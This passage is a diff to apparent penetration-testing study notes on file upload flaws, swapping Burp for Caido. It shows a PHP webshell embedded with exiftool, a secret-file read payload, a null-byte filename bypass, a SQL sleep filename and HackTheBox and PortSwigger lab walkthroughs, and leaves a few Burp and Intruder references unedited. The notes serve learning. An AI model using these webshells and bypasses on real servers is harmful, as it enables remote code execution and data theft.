@@ -53,7 +53,7 @@ To read a specific file:
 
 ### 2. Bypass Content-Type validation
 
-If the server only checks the `Content-Type` header in the multipart request (not the actual file contents), change it in Burp Repeater:
+If the server only checks the `Content-Type` header in the multipart request (not the actual file contents), change it in Caido Replay:
 
 Original upload request part:
 ```http
@@ -385,11 +385,11 @@ filename="shell.php%00.png"
 
 ### HTB — Usage (2024)
 - **Technique variant**: Client-side validation only (CVE-2023-24249)
-- **Attack path**: Laravel-Admin profile picture upload validates filename only in the browser; upload `shell.php.jpg` to pass client-side check, intercept in Burp Suite, rename to `shell.php` before forwarding; server stores whatever filename arrives in the multipart `Content-Disposition` header
+- **Attack path**: Laravel-Admin profile picture upload validates filename only in the browser; upload `shell.php.jpg` to pass client-side check, intercept in Caido, rename to `shell.php` before forwarding; server stores whatever filename arrives in the multipart `Content-Disposition` header
 
 ### HTB — Passage (2020)
 - **Technique variant**: EXIF polyglot + Burp intercept filename rename
-- **Attack path**: CuteNews avatar upload validates extension client-side only; embed PHP webshell via `exiftool -Comment='<?php system($_GET["cmd"]); ?>'` into a valid PNG; intercept upload in Burp and rename from `avatar.png` to `avatar.php`; server saves the binary PNG file as `.php` and executes it
+- **Attack path**: CuteNews avatar upload validates extension client-side only; embed PHP webshell via `exiftool -Comment='<?php system($_GET["cmd"]); ?>'` into a valid PNG; intercept upload in Caido and rename from `avatar.png` to `avatar.php`; server saves the binary PNG file as `.php` and executes it
 
 ## Detection and defence
 
@@ -403,7 +403,7 @@ filename="shell.php%00.png"
 
 ## Tools
 
-- [[burp-suite]] — Repeater and Intruder for modifying upload requests and fuzzing extensions
+- [[caido]] — Replay and Automate for modifying upload requests and fuzzing extensions
 - `exiftool` — create polyglot files by injecting PHP into image metadata
 - `hexedit` — manually prepend magic bytes to a file
 - SecLists — extension wordlists for fuzzing blacklists
@@ -494,7 +494,7 @@ sleep(10)-- -.jpg
 No upload protection at all. Upload a minimal PHP shell directly.
 
 1. Log in as `wiener:peter`, navigate to profile → avatar upload.
-2. Capture the `POST /my-account/avatar` request in Burp Proxy → send to Repeater.
+2. Capture the `POST /my-account/avatar` request in Caido Intercept → send to Replay.
 3. Change `filename="avatar.png"` to `filename="exploit.php"`, replace image bytes with:
 
 ```php
@@ -623,7 +623,7 @@ Exploit steps:
 <?php echo file_get_contents('/home/carlos/secret'); ?>
 ```
 
-2. Capture the `POST /my-account/avatar` upload in Burp; send to Intruder.
+2. Capture the `POST /my-account/avatar` upload in Caido; send to Intruder.
 3. Capture the `GET /files/avatars/shell.php` request; send to a second Intruder tab.
 4. Intruder settings for **both** tabs:
    - Attack type: `Sniper`
